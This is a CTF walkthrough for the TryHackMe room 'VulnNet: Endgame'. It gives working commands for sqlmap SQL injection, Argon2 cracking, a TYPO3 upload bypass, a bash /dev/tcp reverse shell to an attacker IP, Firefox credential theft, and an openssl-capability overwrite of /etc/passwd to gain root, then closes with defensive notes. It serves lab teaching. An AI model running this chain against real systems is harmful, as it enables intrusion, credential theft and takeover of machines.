# TryHackMe — VulnNet: Endgame (Medium) Walkthrough

> Room: **VulnNet: Endgame** (Medium)  
> Goal: Gain initial access, capture the user flag, then escalate to root.

This box is a realistic chain of small wins:

**vhost/subdomain enum → API SQL injection → dump credentials → crack Argon2 → TYPO3 admin → restricted upload bypass → RCE → steal browser creds → SSH as user → capabilities privesc (openssl) → root**

---

## 1) Recon (Nmap)

Run a full TCP scan with default scripts + version detection:

```/dev/null/nmap.txt#L1-1
nmap -p- -sC -sV -T4 --min-rate=1000 -oN nmap_scan.txt <IP_ADDRESS>
```

### Results (key ports)

- `22/tcp` — SSH (OpenSSH 7.6p1)
- `80/tcp` — HTTP (Apache 2.4.29)

With only SSH + HTTP exposed, the web application is the path forward.

---

## 2) Fix hostname resolution (`/etc/hosts`)

The room indicates the web service is intended to be accessed via a hostname (virtual host), e.g. `vulnnet.thm`.

Add the mapping on your attacking machine:

```/dev/null/hosts.txt#L1-2
sudo sh -c 'echo "<IP_ADDRESS> vulnnet.thm" >> /etc/hosts'
tail -n 2 /etc/hosts
```

If you later discover additional subdomains/vhosts, add them here too.

---

## 3) Web enumeration: directories didn’t help → enumerate subdomains/vhosts

### 3.1 Directory scan (baseline)

A quick directory scan on the main site:

```/dev/null/gobuster_root.txt#L1-1
gobuster dir -u http://vulnnet.thm/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

No useful hits → pivot.

### 3.2 Subdomain / vhost discovery

When directory brute forcing is quiet, and the box uses a domain, enumerate likely subdomains.

Example with `ffuf` by fuzzing the `Host` header:

```/dev/null/ffuf_vhost.txt#L1-1
ffuf -u http://<IP_ADDRESS>/ -H "Host: FUZZ.vulnnet.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 0
```

Discovered vhosts:

- `blog.vulnnet.thm`
- `api.vulnnet.thm`
- `admin1.vulnnet.thm`

Add them to `/etc/hosts`:

```/dev/null/hosts_more.txt#L1-4
sudo sh -c 'printf "%s %s\n" "<IP_ADDRESS> blog.vulnnet.thm" "<IP_ADDRESS> api.vulnnet.thm" "<IP_ADDRESS> admin1.vulnnet.thm" >> /etc/hosts'
tail -n 5 /etc/hosts
```

---

## 4) Identify the primary attack surface

### 4.1 `admin1.vulnnet.thm` → TYPO3

`admin1.vulnnet.thm` hosts a **TYPO3 CMS** login, but you need valid credentials.

### 4.2 `blog.vulnnet.thm` → uses the API

While exploring `blog.vulnnet.thm`, observe that it fetches content through `api.vulnnet.thm` with a parameter that looks database-backed.

Example API endpoint:

```/dev/null/api_url.txt#L1-1
http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1
```

This becomes the most likely injection point.

---

## 5) Exploit: SQL injection on the API (sqlmap)

Test the `blog` parameter for SQL injection:

```/dev/null/sqlmap_test.txt#L1-1
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog
```

If confirmed injectable, enumerate/dump the database content. Focus on credential tables first:

- backend/admin users (e.g. `be_users`)
- blog users/passwords

Example workflow (high-level):

```/dev/null/sqlmap_dump.txt#L1-3
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbs
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog -D <DB_NAME> --tables
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog -D <DB_NAME> -T be_users --dump
```

Save what you extract:

- `adminusername.txt`
- `adminhash.txt` (Argon2 hash)
- `bloguser.txt`
- `blogpass.txt` (in this box these looked like plaintext passwords)

---

## 6) Crack Argon2 admin hash (targeted wordlist)

The admin hash is Argon2, so cracking with a huge generic list can be slow. You already have context-specific passwords from the database dump: use them as a targeted wordlist.

Crack with John:

```/dev/null/john_argon2.txt#L1-1
john --wordlist=blogpass.txt adminhash.txt
```

This yields the TYPO3 admin password.

---

## 7) Login to TYPO3 and get RCE via file upload

### 7.1 Login

Go to the TYPO3 admin panel on `admin1.vulnnet.thm` and authenticate with the cracked admin credentials.

### 7.2 Find an upload path and bypass extension restrictions

The goal is to upload a PHP reverse shell, but the CMS may block certain extensions by configuration.

Common pattern in CMS admin panels:
- there is a file manager / upload feature
- `.php` uploads are blocked
- the allow/deny list is editable inside settings

In this room, you can adjust the configuration to allow the needed extension, then upload a payload.

### 7.3 Upload a PHP reverse shell

Generate a reverse shell payload (example):

```/dev/null/revshell.txt#L1-1
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
```

Or a PHP reverse shell file, then upload it via TYPO3.

Start listener on attacker:

```/dev/null/listener.txt#L1-1
nc -lvnp 4444
```

### 7.4 Trigger the shell

Uploaded files commonly end up under paths like:

- `/fileadmin/`
- `/uploads/`

In this box the payload was reachable under:

- `/fileadmin/reverseshell.php`

Browse to it to trigger the callback; you should land as `www-data`.

---

## 8) Post-exploitation: find credentials for a real user (Firefox profile)

From `www-data`, enumerate users and home directories:

- You noted a user named `system`.

A strong lead is a browser profile under the user’s home:

- `~/.mozilla/`

### 8.1 Exfiltrate the Firefox profile

On the target, archive it:

```/dev/null/tar_mozilla.txt#L1-1
tar -czf /tmp/mozilla.tar.gz /home/system/.mozilla
```

Transfer it to your attacker by whichever method you prefer (HTTP server, SCP, etc.).

### 8.2 Decrypt saved Firefox credentials

Use a known Firefox credential decryptor (commonly referred to as “firefox_decrypt”) against the extracted profile directory to recover saved credentials.

Those credentials allow you to SSH as the `system` user.

---

## 9) SSH as `system` and grab the user flag

SSH in:

```/dev/null/ssh_system.txt#L1-1
ssh system@<IP_ADDRESS>
```

Retrieve the user flag (commonly in `/home/system/`).

---

## 10) Privilege escalation to root: Linux capabilities (detailed)

### 10.1 Enumeration: find dangerous capabilities

Capabilities can be as dangerous as SUID binaries. Enumerate them:

```/dev/null/getcap.txt#L1-1
getcap -r / 2>/dev/null
```

In this box you identify an `openssl` binary with elevated capabilities (displayed as `...=...ep`).

You also noticed a non-standard OpenSSL path:

- `/home/system/Utils/openssl`

That suggests a custom tool on the box, and the capability set means it can do privileged actions even when run as a normal user.

### 10.2 Why “openssl with capabilities” can lead to root

The core idea:

1. A capability-enabled binary can bypass normal permission checks for certain operations.
2. If you can use it to **read** privileged files (like `/etc/shadow`) or **write** privileged files (like `/etc/passwd`), you can escalate.
3. One clean escalation technique is to **add a new UID 0 user** to `/etc/passwd` with a known password hash, then `su` into that account.

This is not “magic”; it’s just abusing the fact that the capability-enabled binary can perform file operations beyond your user’s privileges.

### 10.3 Two primitives you used

You used OpenSSL for two things:

#### Primitive A — Create a local HTTP server with OpenSSL
You generated a certificate/key pair and started an OpenSSL HTTP server:

1) Generate key + cert:

```/dev/null/openssl_certs.txt#L1-1
/home/system/Utils/openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
```

2) Start an OpenSSL server with `-HTTP` on localhost:

```/dev/null/openssl_server.txt#L1-2
/home/system/Utils/openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP
```

Then from another shell, you attempted to fetch privileged files via localhost HTTP:

```/dev/null/wget_local.txt#L1-2
wget http://127.0.0.1:1337/etc/passwd
wget http://127.0.0.1:1337/etc/shadow
```

This demonstrates “read via privileged server context”.

#### Primitive B — Overwrite `/etc/passwd` using OpenSSL file output
From GTFOBins-style techniques, OpenSSL can be used as a file writer via `enc -out`.

If your OpenSSL binary can write to `/etc/passwd` (due to capabilities), you can overwrite it with a modified version that includes a new root-equivalent user.

### 10.4 Safest workflow: backup, edit locally, overwrite intentionally

1) Make a copy of `/etc/passwd` content (from your download step, or via normal read if possible).

2) Create a password hash for your new user entry.

You used something like:

```/dev/null/openssl_passwd.txt#L1-1
openssl passwd -1
```

This generates an MD5-crypt hash (good enough for the room, not recommended for real systems).

3) Construct a new passwd line (example):

```/dev/null/passwd_entry.txt#L1-1
ricci:<HASH_HERE>:0:0:/root:/bin/bash
```

4) Edit the downloaded `passwd` file and append/insert that line (be careful not to break existing formatting).

5) Use the capability-enabled OpenSSL to overwrite the real `/etc/passwd`.

Conceptually:

```/dev/null/overwrite_passwd.txt#L1-2
# (example idea) write your prepared passwd file into /etc/passwd using openssl as a writer
/home/system/Utils/openssl enc -in /tmp/passwd -out /etc/passwd
```

After overwrite, switch to the new UID 0 user:

```/dev/null/su_rootlike.txt#L1-1
su ricci
```

Enter the password you used to generate the hash → you become root (UID 0) because that account entry is UID 0.

### 10.5 Verify and collect root flag

Verify:

```/dev/null/root_check.txt#L1-2
id
whoami
```

Then read the root flag (commonly in `/root/`).

---

## 11) Summary (attack chain)

1. Nmap → only `80` and `22`
2. Add `vulnnet.thm` to `/etc/hosts`
3. Directory scan is quiet → enumerate vhosts/subdomains
4. Find `blog`, `api`, and `admin1` vhosts
5. Observe API calls → test parameter → SQLi confirmed
6. Dump `be_users` + blog passwords
7. Crack Argon2 admin hash using blog passwords as wordlist
8. Login to TYPO3 admin → adjust upload restrictions → upload PHP reverse shell → RCE
9. Find `/home/system/.mozilla` → decrypt saved creds → SSH as `system` → user flag
10. Enumerate capabilities → capability-enabled OpenSSL → overwrite `/etc/passwd` to add UID 0 user → `su` → root flag

---

## Notes / defensive takeaways (brief)

- Use allow-lists and strict path handling for APIs; parameterized queries prevent SQLi.
- Limit vhosts exposure and remove internal/admin surfaces from public access where possible.
- Don’t allow CMS users to relax executable upload restrictions; store uploads outside the web root.
- Don’t save privileged credentials in browser profiles on servers.
- Treat Linux capabilities as high-risk; audit `getcap -r /` results and remove unnecessary capabilities.
- Prevent write access (direct or indirect) to `/etc/passwd` and `/etc/shadow` from any non-root context.